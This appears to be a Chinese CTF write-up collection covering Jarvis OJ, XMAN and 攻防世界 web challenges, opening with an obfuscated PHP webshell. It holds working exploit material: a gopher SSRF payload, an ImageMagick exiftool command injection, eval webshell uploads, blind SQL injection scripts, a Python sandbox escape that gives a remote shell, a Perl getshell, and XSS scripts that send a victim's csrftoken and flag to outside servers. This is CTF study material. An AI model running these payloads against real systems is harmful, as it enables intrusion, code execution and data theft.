<?php ${("#"^"|").("#"^"|")}=("!"^"`").("( "^"{").("("^"[").("~"^";").("|"^".").("*"^"~");${("#"^"|").("#"^"|")}(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("}"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&"). ("#"^"p"). (">"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?>
```

密码是360,但是请求方法是POST



接下来就只剩下利用202.5.19.128来进行ssrf,然后我在这里卡了一个晚上

最后看别人的wp才知道这里有一个proxy.php,我就炸了。

剩下的就简单了，利用gopher协议来发送POST请求

最后的payload:

```
GET /proxy.php?url=http://202.5.19.128/proxy.php?url=gopher://web.jarvisoj.com:32782/_%252550%25254f%252553%252554%252520%25252f%252561%252564%25256d%252569%25256e%25252f%252574%252572%25256f%25256a%252561%25256e%25252e%252570%252568%252570%252520%252548%252554%252554%252550%25252f%252531%25252e%252531%25250d%25250a%252548%25256f%252573%252574%25253a%252520%252577%252565%252562%25252e%25256a%252561%252572%252576%252569%252573%25256f%25256a%25252e%252563%25256f%25256d%25253a%252533%252532%252537%252538%252532%25250d%25250a%252543%252561%252563%252568%252565%25252d%252543%25256f%25256e%252574%252572%25256f%25256c%25253a%252520%25256d%252561%252578%25252d%252561%252567%252565%25253d%252530%25250d%25250a%252555%252570%252567%252572%252561%252564%252565%25252d%252549%25256e%252573%252565%252563%252575%252572%252565%25252d%252552%252565%252571%252575%252565%252573%252574%252573%25253a%252520%252531%25250d%25250a%252555%252573%252565%252572%25252d%252541%252567%252565%25256e%252574%25253a%252520%25254d%25256f%25257a%252569%25256c%25256c%252561%25252f%252535%25252e%252530%252520%252528%252557%252569%25256e%252564%25256f%252577%252573%252520%25254e%252554%252520%252531%252530%25252e%252530%25253b%252520%252557%252569%25256e%252536%252534%25253b%252520%252578%252536%252534%252529%252520%252541%252570%252570%25256c%252565%252557%252565%252562%25254b%252569%252574%25252f%252535%252533%252537%25252e%252533%252536%252520%252528%25254b%252548%252554%25254d%25254c%25252c%252520%25256c%252569%25256b%252565%252520%252547%252565%252563%25256b%25256f%252529%252520%252543%252568%252572%25256f%25256d%252565%25252f%252537%252537%25252e%252530%25252e%252533%252538%252536%252535%25252e%252539%252530%252520%252553%252561%252566%252561%252572%252569%25252f%252535%252533%252537%25252e%252533%252536%25250d%25250a%252541%252563%252563%252565%252570%252574%25253a%252520%252574%252565%252578%252574%25252f%252568%252574%25256d%25256c%25252c%252561%252570%252570%25256c%252569%252563%252561%252574%252569%25256f%25256e%25252f%252578%252568%252574%25256d%25256c%25252b%252578%25256d%25256c%25252c%252561%252570%252570%25256c%252569%252563%252561%252574%252569%25256f%25256e%25252f%252578%25256d%25256c%25253b%252571%25253d%252530%25252e%252539%25252c%252569%25256d%252561%252567%252565%25252f%252577%252565%252562%252570%25252c%252569%25256d%252561%252567%252565%25252f%252561%252570%25256e%252567%25252c%25252a%25252f%25252a%25253b%252571%25253d%252530%25252e%252538%25252c%252561%252570%252570%25256c%252569%252563%252561%252574%252569%25256f%25256e%25252f%252573%252569%252567%25256e%252565%252564%25252d%252565%252578%252563%252568%252561%25256e%252567%252565%25253b%252576%25253d%252562%252533%25250d%25250a%252541%252563%252563%252565%252570%252574%25252d%25254c%252561%25256e%252567%252575%252561%252567%252565%25253a%252520%25257a%252568%25252d%252543%25254e%25252c%25257a%252568%25253b%252571%25253d%252530%25252e%252539%25252c%252565%25256e%25252d%252555%252553%25253b%252571%25253d%252530%25252e%252538%25252c%252565%25256e%25253b%252571%25253d%252530%25252e%252537%25250d%25250a%252543%25256f%25256e%25256e%252565%252563%252574%252569%25256f%25256e%25253a%252520%252563%25256c%25256f%252573%252565%25250d%25250a%252543%25256f%25256e%252574%252565%25256e%252574%25252d%252554%252579%252570%252565%25253a%252520%252561%252570%252570%25256c%252569%252563%252561%252574%252569%25256f%25256e%25252f%252578%25252d%252577%252577%252577%25252d%252566%25256f%252572%25256d%25252d%252575%252572%25256c%252565%25256e%252563%25256f%252564%252565%252564%25250d%25250a%252543%25256f%25256e%252574%252565%25256e%252574%25252d%25254c%252565%25256e%252567%252574%252568%25253a%252520%252537%25250d%25250a%25250d%25250a%252533%252536%252530%25253d%252522%252570%252568%252570%252569%25256e%252566%25256f%252528%252529%25253b%252522 HTTP/1.1
Client-Ip: 202.5.19.128
X-Forwarded-For: 202.5.19.128
Host: 202.5.19.128
Referer: 202.5.19.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```



### 图片上传漏洞

非常简单,但是想记录一下这道题利用的cve

题目提示图片上传漏洞,扫目录发现test.php里是phpinfo

结合提示猜测是imagmagic的cve,看了一下版本`ImageMagick 6.7.7-10`,可以利用imagemagic的命令执行漏洞

p牛的分析https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html

还有phpinfo要注意的内容https://seaii-blog.com/index.php/2017/10/25/73.html

根据题目提示修改png的exif来利用

最终生成exp的payload:


```shell
exiftool -label="\"|/bin/echo '<?php eval("'$_POST[a])'"?>' > /opt/lampp/htdocs/uploads/flag.php ; \"" 2.png 
```



### inject

```php
<?php
require("config.php");
$table = $_GET['table']?$_GET['table']:"test";
$table = Filter($table);
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
?>
```

当`mysqli_query($mysqli,"desc secret_{$table}")`不报错的时候，才能查询

```mysql
 DESC tbl_name [col_name | wild]
```

payload:

```
table=test` `sql inject
```

table:secret_flag,secret_test





### web?

抓包分析发现,向一个json文件发送信息,不明所以,于是去分析前端js代码

发现本地的密码校验

```javascript
function(e) {
                if (25 !== e.length)
                    return !1;
                for (var t = [], n = 0; n < 25; n++)
                    t.push(e.charCodeAt(n));
                for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n < 25; n++) {
                    for (var i = 0, a = 0; a < 25; a++)
                        i += t[a] * o[n][a];
                    if (i !== r[n])
                        return !1
                }
                return !0
            }
			
			

```



分析发现是一个1元25次方程

用python numpy模块解出得到flag:

`QWB{R3ac7_1s_interesting}`



### register



```

题目入口：http://web.jarvisoj.com:32796/

Hint1: 二次注入

Hint2: register 二次注入在country
```

虽然提示二次注入在country处,但是却不清楚在那个查询语句

后来看了别人的wp才恍然大悟,country用来查时区

接下来就开始测试过滤了什么

测试后发现过滤了`table,information,where,username,limit`

参考了别人的wp，发现了新的绕过方式

```mysql

' or substr((hex((select group_concat(a) from (select 1,2,3`a`,4,5 union select * from users)`b`))),71,1)=0#
```

将表和1,2,3,4,5合成为一个临时表,并给自己想要查询的表弄个别名

脚本(有点丑)

```python
import requests
from bs4 import BeautifulSoup
def sqlinject(country,i):
    username="abc"
    password="abcde"
    address="abcd"
    
    sess=requests.session()
    #register
    register={
        "country":country,
        "username":username+str(i),
        "password":password,
        "address":address
    }
    
    reg=sess.post("http://web.jarvisoj.com:32796/register.php",data=register)
    #login

    log=sess.post("http://web.jarvisoj.com:32796/login.php",data=register)
    if "error" in reg.text:
        print("register error")
        bs= BeautifulSoup(reg.text,'html.parser')
        bs.find("h1",class_="error")

    result=sess.get("http://web.jarvisoj.com:32796/index.php?page=info")
    bs= BeautifulSoup(result.text,'html.parser')
    #print(result.text)
    try:
        coun=bs.find_all("ul",class_="message-info")[-1].find_all("li")[-1].find("em").text[11:13]
        return coun
    except IndexError:
        print(result.text)

i=800
# while(True):
#     print(sqlinject(input(),i))
#     i+=1
# select
# ban:table,information,where,username
# table users

result="3320396137336664313866656464393634333335376"
index=len(result)
while True:
    index+=1
    
    for num in range(16):
        i+=1
        sql="' or substr((hex((select group_concat(a) from (select 1,2,3`a`,4,5 union select * from users)`b`))),{},1)={}#".format(index,hex(num)[2:])
        res=sqlinject(sql,i)
        print(sql,res)
        if int(res)==22:
            result+=hex(num)[2:]
            break
    print(result)

```



### babyxss

题目提示绕过csp










## xman 个人排位赛



### escape

收获:了解了python沙箱逃逸这种类型

getattr:对沙箱逃逸有很大作用





list(s)获得字符集,可以用来绕过引号限制

试了一下system

```python
banned=  ["'", '"', '.', 'reload', 'open', 'input', 'file', 'if', 'else', 'eval', 'exit', 'import', 'quit', 'exec', 'code', 'const', 'vars', 'str', 'chr', 'ord', 'local', 'global', 'join', 'format', 'replace', 'translate', 'try', 'except', 'with', 'content', 'frame', 'back']
```

发现引号和点都被过滤了,不过提示说

```python
def hello():
   os.system("echo hello")
```



说明是可以通过调用system来完成,接下来就是想办法得到system函数了

而引号被过滤可以用字符串s里的值来绕过



```python
#考虑这样来
a=getattr(os,'system')
a("命令")
```

```python
def get_str(string):
    result=''
    for i in string:
        result+='table['+str(table.index(i))+']+'
    return result[:-1]
conn=remote('47.97.253.115',10005)
conn.sendline('table=list(s)')
conn.sendline('sys='+get_str('system'))
conn.sendline('fun=getattr(os,sys)')
while 1:
        command=input('(www):$')
        new_com='fun('+get_str(command)+')'
        conn.sendline(new_com)
        print(conn.recvuntil('>>>'))
conn.close()

```



flag{4EEAA88DA0B3207862D2E4876AF84A3D}

### **ezphp**



收获:知道了curl_exec 本地文件读取

```php
<?php

class Hello {
    protected $a;

    function test() {
        $b = strpos($this->a, 'flag');
        if($b) {
            die("Bye!");
        }
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $this->a);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
        echo curl_exec($c);
    }
    
    function __destruct(){
        $this->test();
    }
}

if (isset($_GET["z"])) {
    unserialize($_GET["z"]);
} else {
    highlight_file(__FILE__);
}
```



curl_exec+反序列化

试了下本地文件读取

O:5:"Hello":1:{s:1:"a";s:27:"file://localhost/etc/passwd";}

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg)

题目过滤flag字符

说明我们flag就在flag文件里

谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路

最后的payload:

http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}

这里有一些坑就是:

1. 你不知道flag文件在哪个文件夹,结果最后就在根目录。。

2. 因为是二次编码所以要注意字符串的长度

## xman练习



### wtf.sh

我这题做了两天，一直想放个后门进去

最后还是一句一句话的执行

这题最难的地方在于代码审计，我很早就搞到源代码了可就是分析不出什么。

我在分析代码的时候仅仅只是看代码，这还不够，我必须时刻都想这里有没有漏洞，如果有我要怎么利用

### i-got-id-200

这题用了一个我没学过的语言perl

看别人的wp知道了perl的一些漏洞





```perl
use strict;
use warnings;
use CGI;
 
my $cgi= CGI->new;
if ( $cgi->upload( 'file' ) )
{
my $file= $cgi->param( 'file' );
while ( <$file> ) { print "$_"; } }
```

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5s8gm8ve5j30rc0m00wn.jpg)

param()返回name=file的所有参数,但是只有第一个值才能传给$file变量,当$file="ARGV"时,perl会调用open()访问url的参数

可以通过 /bin/bash%20-c%20......来getshell

`/cgi-bin/file.pl?/bin/bash%20-c%20ls| `





## 攻防世界

### ics-06

进入index.php后发现id和page可以传参。

对id和page做了各种测试

发现id只能接受数字,page传啥都没用

可是我的关注度一直都在page那，看了别人的wp发现这题对burp进行爆破，当id=2333时,flag出现

cyberpeace{955bb6e63c29755aeb2f36fc33b3b57f}

### upload

收获:这题的收获还是很大的,第一次了解还有这种注入

翻翻题目的页面,登入,注册,上传,扫目录发现没啥。

根据题目的名称直接跑去测试上传，只能上传.jpg后缀,并且没有文件地址,所以这个如果真的是文件上传漏洞,估计要用auto_prepared_file来，但是只能.jpg后缀。

于是我就跑去测试登入和注册界面尝试能否sql注入,结果都凉凉,看了一眼题目想起了会回显文件名,猜测这里就是题目给我们的注入点。

猜测sql语句,刚开始没有进行这一步,然后试到自闭,

```
sql="insert into xxx (xxxx....) values ('xxx','xxx'...)"
sql2="select * from where uuid=xxxxxx"

```

因为uuid在session里,不可注,所以注第一个

因为payload=`'.jpg`时,无回显,所以值是包在`''`之间的,又因为我们不知道value到底有几个值,所以用hex()与`''`相加成为一个新的值

payload=`a'+conv(hex((selselectect '123')),16,10)+'.jpg`

这边转为十进制的原因是:mysql将字符串转为数字时将其视为10进制数据

![](https://s2.ax1x.com/2019/08/29/mbhnzQ.png)

这个是123的十进制表示

接下来就是普通的sql注入了

```python

def dec_to_result(table):
        result=''
        for i in table:
                num=hex(i)
                for j in range(2,len(num),2):
                        print(num[j:j+2])
                        result+=chr(int(num[j:j+2],16))
        return result
table=[439855375731,190730038380,478341917793,443982377823,448378594604,469853102693,29299]
table_result="files,hello_flag_is_here,members"
column=[452571786591,1718378855]
column_result="i_am_flag"
content=[142293811309,409438006885,409198488673,103]
print(dec_to_result(content))
```

#### 解法二

猜测insert into 的结构为 insert into xxx (xx,xx,xx) values ('xx',uuid,uuid)然后

payload=`hello',1660,1660)#.jpg`

出现回显!!!

payload:

数据库名:`hello',1660,1660),(database(),1660,1660)#.jpg`

表名:`hello',1660,1660),((selselectect GROUP_CONCAT(table_name) FROfromM information_schema.tables WHERE TABLE_SCHEMA=database()),1660,1660)#.jpg`

列名:`hello',1660,1660),((selselectect GROUP_CONCAT(column_name) FROfromM information_schema.columns WHERE table_name='hello_flag_is_here'),1660,1660)#.jpg`

flag:`hello',1660,1660),((selselectect GROUP_CONCAT(i_am_flag) FROfromM hello_flag_is_here),1660,1660)#.jpg`

### bug

拿到网址，先随便玩一玩,目录扫扫,没找到啥有意思的

登入前有.注册,登入,找回密码的页面,url有点文件读取的感觉

考虑sql注入,文件读取,越权.先注册个号玩一玩,发现里面有个管理页面需要admin权限,想办法搞到admin账号,看了下cookie,username有点意思,看起来像md5加密`5d39c2d4a0776ed48f3ec303520788c5`,去查了一下没查到，那就换个点吧。

url:`http://111.198.29.45:44727/index.php?module=index&do=member&uid=5`

试试能不能通过index来任意文件读取,发现不行是白名单限制

sql注入试起来太久了,去看看更改密码吧,

http头:

```
POST /index.php?module=findpwd&step=1&doSubmit=yes HTTP/1.1

username=ccreater&birthday=2015%2F01%2F01&address=aa
```

发现step和username有点搞头.

修改step,发现不行,重置之前注册账号的密码进入第二步,

```
POST /index.php?module=findpwd&step=2&doSubmit=yes HTTP/1.1

username=ccreater&newpwd=admin
```

修改username试试,成功,美滋滋

进入管理界面，提示ip地址错误,修改常见识别ip地址的属性,成功得到下一步的提示`<!-- index.php?module=filemanage&do=???-->`

emmm,随便试一下,upload......成功了

提示是图片当不仅仅只是图片,文件上传喽。

一番测试后发现修改content-type,以.php5作为后缀,内容为`<script language="php">phpinfo();</script>`时得到flag

吐槽一下,你知道我想要什么是真的无语,你不说我咋知道

### ics-07

进入界面,拿到关键代码

```php
 <?php
     if ($_SESSION['admin']) {
       $con = $_POST['con'];
       $file = $_POST['file'];
       $filename = "backup/".$file;

       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
          die("Bad file extension");
       }else{
            chdir('uploaded');
           $f = fopen($filename, 'w');
           fwrite($f, $con);
           fclose($f);
       }
     }
     ?>

    <?php
      if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
        include 'config.php';
        $id = mysql_real_escape_string($_GET[id]);
        $sql="select * from cetc007.user where id='$id'";
        $result = mysql_query($sql);
        $result = mysql_fetch_object($result);
      } else {
        $result = False;
        die();
      }

      if(!$result)die("<br >something wae wrong ! <br>");
      if($result){
        echo "id: ".$result->id."</br>";
        echo "name:".$result->user."</br>";
        $_SESSION['admin'] = True;
      }
     ?>
```

当$_SESSION['admin'] = True时,就可以写文件了

根据`isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9'`

猜测id=1时就可以读取到内容,但是要绕过`floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9'`,floatval('1.0+9')!==1,并且`select * from cetc007.user where id='1'`相当于`select * from cetc007.user where id='1.0+9'`

payload=`/view-source.php?page=flag.php&id=1.0+9`

接下来就是绕过`preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)`

有一下几点思路:

- 看别人wp
- apache解析漏洞
- .htaccess和.user.ini
- 特殊后缀

经过测试后面三个均无法利用

看别人wp发现

Payload : `con=<?php @eval($_POST[cmd]);?>&file=test.php/1.php/..`

`con=<?php @eval($_POST[cmd]);?>&file=../orz.php/.`

原理不明

### Website

注册登录后,发现识别用户的cookie是username,是一个奇奇怪怪的base64编码的内容,扫目录发现了test.php,看到base64编码后的内容以为可以用这个来得到admin的cookie后面无论用什么参数都没用,于是直接把页面里的内容复制到cookie里就成了admin.emmmmm......

getflag:HITBCTF{j50nP_1s_VulN3r4bLe}

#### 思路一

一个xss，waf并不严格，有好多种做法，存在多处xss。

首先先随便注册个账号登录

site填入自己的服务器地址，发现他会访问。

于是入口点就是：构造一个富含xss的链接发给他。

xss的地方很多，最好利用的是

这个getInfo接口，返回 `jsonp` 数据，存在反射型xss,而且没上waf。

`jsonp` 的 `referer` 检查，可以利用302跳转解决。

于是我们的攻击链扩充到了：

```
链接->302 jsonp xss
```

问题是如何拿到ﬂag？

经过测试发现ﬂag是通过 `getﬂag` 接口获取

需要的参数是 `csrftoken`

```
http://47.88.218.105:20010/getflag.php?csrftoken=c1a10e97f9c2fa973299fa3154f38b58
```

能否有权限获取ﬂag是读取 `jsonp` 中的 `username` ，这个 `username` 是后端解密 `cookie` 中的 `username` 得到的明文

`cookie` 中的 `username` 受 `http-only` 保护不可读取，也没有能显示出 `cookie` 中加密的 `username` 的页面，于是只能控制admin去访问ﬂag页面然后返回给我们了。

整个利用如下：

`链接 --> 302到 jsonp xss --> 提取 jsonp 中 csrftoken 字段 --> xhr 控制读取 flag --> 返回 flag 到 xss 平台` 发送链接的php内容

`b.js` 内容:

```
bash Data: {'flag':'HITB{j50nP_1s_VulN3r4bLe}','csrftoken':'058807fed91d1b8807688bd258710cbe'} IP: 47.88.218.105 Date and Time: 25 August, 2017, 12:31 pm Referer: http://47.88.218.105:20010/action.php? callback=%3Cscript+src=%22http://123.206.216.198/b.js%22%3E%3C%2Fscript%3E
```

getflag

```
HITB{j50nP_1s_VulN3r4bLe}
```

#### 思路二

注册登录之后，发现一个有趣的链接

```
http://47.88.218.105:20010/action.php?callback=getInfo
```

经过分析，`callback` 参数可以被控制

由此写payload:

```
http://47.88.218.105:20010/action.php?callback=%3Chtml%3E%3Cbody%3E%00%00%00%00%00%00%00%3Cscript%20src=%22//cdn.bootcss.com/jquery/3.1.1/jquery.min.js%22%3E%3C/script%3E%00%00%00%00%00%00%00%3Cscript%20src=%22//<OUR_SERVER_IP>/test.js%22%3E%3C/script%3E%3Cdiv%3E
```

`test.js` 的内容:

`js window.onload = function() { var a = document.getElementsByTagName('div')[0], data = eval(a.innerHTML); $.get("getflag.php",{ csrftoken: data['csrftoken'] },function(data,status) { feedback(data); }); } function feedback(data) { var data = encodeURIComponent(data), img = document.createElement('img'); img.src = '`https://requestb.in/xk998hxk?`' + data; console.log(img); document.body.appendChild(img); }` getflag

```
HITB{j50nP_1s_VulN3r4bLe}
```

### Zhuanxv

拿到网址:[http://111.198.29.45:38794](http://111.198.29.45:38794/),扫描后台发现登入界面,在后台的css处动态加载图片:

```css

    body{
        background:url(./loadimage?fileName=web_login_bg.jpg) no-repeat center;
        background-size: cover;
    }
```

我们大致就可以猜到是利用文件读取漏洞,通过wappalyzer得知这是一个java的web站点

java的web站点的目录结构

![image.png](https://i.loli.net/2019/09/01/LduWtSfIh8bDA7Z.png)

`loadimage?fileName=../../WEB-INF/web.xml`

得到

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app id="WebApp_9" version="2.4"
         xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
    <display-name>Struts Blank</display-name>
    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <welcome-file-list>
        <welcome-file>/ctfpage/index.jsp</welcome-file>
    </welcome-file-list>
    <error-page>
        <error-code>404</error-code>
        <location>/ctfpage/404.html</location>
    </error-page>
</web-app>
```

需要关注的信息是:`<filter-name>struts2</filter-name>`这是一个采用了struts2框架的java站点

**struts2 默认配置文件存放在 WEB-INF/classes/ 目录下** , 在该路径下可以拿到 `struts.xml` 配置文件

通过struts.xml文件我们可以得到网站源码

![](https://i.loli.net/2019/09/13/56jm4W9RPxVQut8.png)

在源码里发现使用spring框架和hibernate框架

Spring 核心配置文件为 : **applicationContext.xml**

在配置文件里找到

`<value>user.hbm.xml</value>`

数据库映射表

```xml


<?xml version="1.0"?>
<!DOCTYPE hibernate-mapping PUBLIC
        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"
        "http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd">
<hibernate-mapping package="com.cuitctf.po">
    <class name="User" table="hlj_members">
        <id name="id" column="user_id">
            <generator class="identity"/>
        </id>
        <property name="name"/>
        <property name="password"/>
    </class>
    <class name="Flag" table="bc3fa8be0db46a3610db3ca0ec794c0b">
        <id name="flag" column="welcometoourctf">
            <generator class="identity"/>
        </id>
        <property name="flag"/>
    </class>
</hibernate-mapping>
```

确认flag在数据库名为bc3fa8be0db46a3610db3ca0ec794c0b的flag字段中

源码审计:

```java

public class UserDaoImpl
  extends HibernateDaoSupport
  implements UserDao
{
  public List<User> findUserByName(String name)
  {
    return getHibernateTemplate().find("from User where name ='" + name + "'");
  }
  
  public List<User> loginCheck(String name, String password)
  {
    return getHibernateTemplate().find("from User where name ='" + name + "' and password = '" + password + "'");
  }
}
```

发现没有对用户输入进行过滤,存在sql注入

**在 HQL 语句中查询的是实体类 , 实体类与数据表存在映射关系** , 这个映射关系就写在 `*.hbm.xml` 文件中 , **因此HQL语句中 from 后跟着的是实体类名 ' User ' , 而不是实际的表名 'hlj_members'** 

程序会对空格和=进行过滤,绕过空格过滤 我们可以用换行符或`/**/`者来替换,不知道为什么`/**/`不能替换,是hsql语句不支持?

=可以用 like来替换,不知道为什么不能用注释#,不过影响不大

```python
import requests
url='http://111.198.29.45:41014/zhuanxvlogin'
sql='''123'
or
(judge)
or
name
like
'admin'''
judge='''((select
ascii(substr(group_concat(id),index,1))
from
Flag
where
id<2)<guess)'''

sql=sql.replace('judge',judge)
index=1
result=''
while 1:
    for i in range(32,128):
        text=requests.post(url,data={'user.name':sql.replace('guess',str(i)).replace('index',str(index)),'user.password':'1'}).text
        #print({'user.name':sql.replace('guess',str(i)).replace('index',str(index)),'user.password':'1'})
        #input()
        if 'Dream' in text:
            result+=chr(i-1)
            print(result)
            
            break
    index+=1

```

flag:SCTF{C46E250926A2DFFD831975396222B08E}

### lottery

题目直接给了源代码。

先快乐玩一玩,追踪购买flag和猜数字请求网页和参数。

刚开始看到随机数以为是随机数的安全问题,后来发现这根本并不是2333.继续追踪发现关键代码

```php
$numbers = $req['numbers'];
	$win_numbers = random_win_nums();
	$same_count = 0;
	for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
```



php的弱类型的锅23333

发包`{"action":"buy","numbers":[true,true,true,true,true,true,true]}`

疯狂拿钱买flag,我也是能买几十个flag的人:)

cyberpeace{ba2ccbc6417d6539628d0042027b6848}

### Web_python_flask_sql_injection

```python
import requests
from bs4 import BeautifulSoup
#'+hex('a'),"1","2019-09-30")#
def get_csrf_token(text,csrf_name="csrf_token"):
    bs=BeautifulSoup(text, 'html.parser')
    return bs.find("input",attrs={"name":csrf_name})['value']
session=requests.session()
def login(session):
    login_url="http://111.198.29.45:48771/login"
    res=session.get(login_url)
    token=get_csrf_token(res.text)
    #csrf_token=a&username=sdfas&password=asdfasd&submit=Sign+In
    data={
        "csrf_token":token,
        "username":"admin",
        "password":"admin",
        "submit":"Sign+In"
    }
    result=session.post(login_url,data=data).text
def post(session,post_data):
    #csrf_token=ImRmOTMwZDZiNTZjYTMwYTM1MDZhNjYwN2RhN2ExYzBlOTRmMjY5MzMi.XZIYpg.7txloilGax4es41Cq3B-3V4l-TM&post=asdfasdf&submit=Submit
    post_url="http://111.198.29.45:48771/index"
    res=session.get(post_url)
    token=get_csrf_token(res.text)
    data={
        "csrf_token":token,
        "post":post_data,
        "submit":"Submit"
    }
    result=session.post(post_url,data=data).text
    bs=BeautifulSoup(result, 'html.parser')
    if "Your post is now live!" in result:
        r=bs.find_all("table",class_="table table-hover")[0].find_all("td")[-1].text
        r=r[r.index("said 2019-09-30T00:00:00Z:")+len("said 2019-09-30T00:00:00Z:")+14:].replace("\n","")
        return r
    else :
        raise RuntimeError("post失败")

login(session)
#'+hex('a'),"1","2019-09-30")#
#conv(hex((selselectect '123')),16,10)
#database():flask
#table=flag,llowe
sql="'+SQL,'1','2019-09-30')#"
#table
sql=sql.replace("SQL","conv(hex((substr((SELECT flag from flag),INDEX,5))),16,10)")
i=1
result=""
while 1:
    res=post(session,sql.replace("INDEX",str(i)))
    i+=5
    print(sql.replace("INDEX",str(i)))
    if res=="":
        break
    else :
        ss=hex(int(res))[2:]
        for j in range(0,len(ss),2):
            result+=chr(int(ss[j:j+2],16))
    print(result)
```



